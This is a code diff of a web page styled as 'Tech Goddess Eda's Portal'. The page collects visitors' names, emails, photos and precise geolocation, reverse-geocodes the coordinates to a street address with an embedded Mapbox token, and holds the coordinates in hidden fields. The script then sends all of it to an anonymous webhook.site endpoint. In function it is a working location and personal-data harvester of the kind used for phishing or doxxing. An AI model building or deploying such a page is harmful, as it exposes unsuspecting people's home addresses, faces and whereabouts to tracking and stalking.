@@ -10,48 +10,37 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
+      height: 100vh;
       background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
       font-family: 'Helvetica Neue', Arial, sans-serif;
       color: #fff;
     }
     .container {
-      background: rgba(0, 0, 0, 0.85);
-      border-radius: 12px;
+      background: rgba(0,0,0,0.85);
       padding: 2rem;
+      border-radius: 12px;
       max-width: 400px;
       width: 90%;
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.7);
       text-align: center;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.7);
     }
-    h1 { font-size: 1.8rem; margin-bottom: 0.5rem; color: #f1c40f; }
+    h1 { font-size: 1.8rem; margin-bottom: 0.75rem; color: #f1c40f; }
     p.lead { margin-bottom: 1.5rem; font-size: 1rem; color: #ecf0f1; }
-    button, input[type="submit"] {
-      margin-top: 1rem;
-      padding: 0.75rem 1.5rem;
-      font-size: 1rem;
-      color: #111;
-      background: #f1c40f;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-      width: 100%;
-    }
-    button:hover, input[type="submit"]:hover { background: #d4ac0d; }
-    label { display: block; margin: 0.75rem 0 0.25rem; font-size: 0.9rem; color: #ecf0f1; text-align: left; }
-    input[type="text"], input[type="email"], input[type="file"] {
-      width: 100%; padding: 0.5rem; border: none; border-radius: 4px; margin-bottom: 0.75rem;
-    }
+    button { width: 100%; padding: 0.75rem; font-size: 1rem; background: #f1c40f; color: #111; border: none; border-radius: 6px; cursor: pointer; transition: background 0.3s; }
+    button:hover { background: #d4ac0d; }
     #geoStatus { margin-top: 1rem; font-size: 1rem; color: #2ecc71; min-height: 1.2rem; }
-    #addressDisplay { margin: 0.5rem 0; font-size: 0.9rem; color: #ecf0f1; min-height: 2rem; }
+    #addressDisplay { margin-top: 0.5rem; font-size: 1rem; color: #ecf0f1; }
+    label { display: block; margin-top: 1rem; text-align: left; font-size: 0.9rem; color: #ecf0f1; }
+    input[type="text"], input[type="email"], input[type="file"] { width: 100%; padding: 0.5rem; margin-top: 0.25rem; border-radius: 4px; border: none; }
+    input[type="submit"] { margin-top: 1.5rem; width: 100%; padding: 0.75rem; font-size: 1rem; background: #f1c40f; color: #111; border: none; border-radius: 6px; cursor: pointer; transition: background 0.3s; }
+    input[type="submit"]:hover { background: #d4ac0d; }
     .success { margin-top: 1rem; font-size: 0.9rem; color: #2ecc71; }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Welcome to Tech Goddess Eda’s Portal</h1>
-    <p class="lead">Submit your details & allow precise location detection:</p>
+    <p class="lead">Click the button to detect and display your full street address:</p>
 
     <button id="locateBtn">Detect Exact Location</button>
     <p id="geoStatus"></p>
@@ -65,12 +54,12 @@
       <input type="email" id="email" name="email" placeholder="Your email" required>
 
       <label for="address">Postal Address</label>
-      <input type="text" id="address" name="address" placeholder="Street, City, Country" required>
+      <input type="text" id="address" name="address" placeholder="Automatically filled on detect" required>
 
       <label for="photo">Upload Photo</label>
       <input type="file" id="photo" name="photo" accept="image/*" required>
 
-      <!-- Hidden coords -->
+      <!-- Hidden fields for coords -->
       <input type="hidden" id="latitude" name="latitude">
       <input type="hidden" id="longitude" name="longitude">
 
@@ -80,41 +69,50 @@
   </div>
 
   <script>
-    // Replace this with your Webhook.site URL
+    // Configuration
     const webhookUrl = 'https://webhook.site/2c290c87-24d2-41e3-9d15-f9fbb4c5425d';
     const mapboxToken = 'pk.eyJ1IjoiY29vbDU4IiwiYSI6ImNtYWNjMDhtdjAxYTgya3NldnpoeDYydngifQ.5_7aPa23SL8SYpODyetb-Q';
+
+    // Elements
     const locateBtn = document.getElementById('locateBtn');
     const statusEl = document.getElementById('geoStatus');
     const addressEl = document.getElementById('addressDisplay');
+    const addressInput = document.getElementById('address');
 
+    // Geolocation & Reverse Geocoding
     locateBtn.addEventListener('click', () => {
-      addressEl.textContent = '';
-      if (!navigator.geolocation) return statusEl.textContent = 'Geolocation not supported';
-      statusEl.textContent = 'Locating...';
-      navigator.geolocation.getCurrentPosition(async pos => {
+      statusEl.textContent = '';
+      addressEl.textContent = 'Locating…';
+      if (!navigator.geolocation) {
+        return addressEl.textContent = 'Geolocation not supported';
+      }
+      navigator.geolocation.getCurrentPosition(async (pos) => {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
-        statusEl.textContent = `Lat: ${lat.toFixed(6)}, Lon: ${lon.toFixed(6)}`;
-        document.getElementById('latitude').value = lat;
-        document.getElementById('longitude').value = lon;
-
-        // Reverse geocode via Mapbox
+        // Reverse-geocode with Mapbox
         try {
           const url = `https://api.mapbox.com/geocoding/v5/mapbox.places/${lon},${lat}.json?access_token=${mapboxToken}`;
           const res = await fetch(url);
           const data = await res.json();
-          if (data.features.length) {
-            const fullAddr = data.features[0].place_name;
-            addressEl.textContent = fullAddr;
-            document.getElementById('address').value = fullAddr;
+          if (data.features && data.features.length) {
+            const fullAddress = data.features[0].place_name;
+            addressEl.textContent = fullAddress;
+            addressInput.value = fullAddress;
+            document.getElementById('latitude').value = lat;
+            document.getElementById('longitude').value = lon;
+          } else {
+            addressEl.textContent = 'Address not found';
           }
         } catch (e) {
           addressEl.textContent = 'Address lookup failed';
         }
-      }, () => statusEl.textContent = 'Location failed', { enableHighAccuracy: true });
+      }, () => {
+        addressEl.textContent = 'Location detection failed';
+      }, { enableHighAccuracy: true, timeout: 15000 });
     });
 
-    document.getElementById('userForm').addEventListener('submit', async e => {
+    // Form Submission
+    document.getElementById('userForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const f = e.target;
       const payload = {
@@ -132,7 +130,9 @@
           body: JSON.stringify(payload)
         });
         document.getElementById('message').textContent = 'Submitted successfully!';
-        f.reset(); statusEl.textContent = ''; addressEl.textContent = '';
+        f.reset();
+        statusEl.textContent = '';
+        addressEl.textContent = '';
       } catch {
         document.getElementById('message').textContent = 'Submission error';
       }
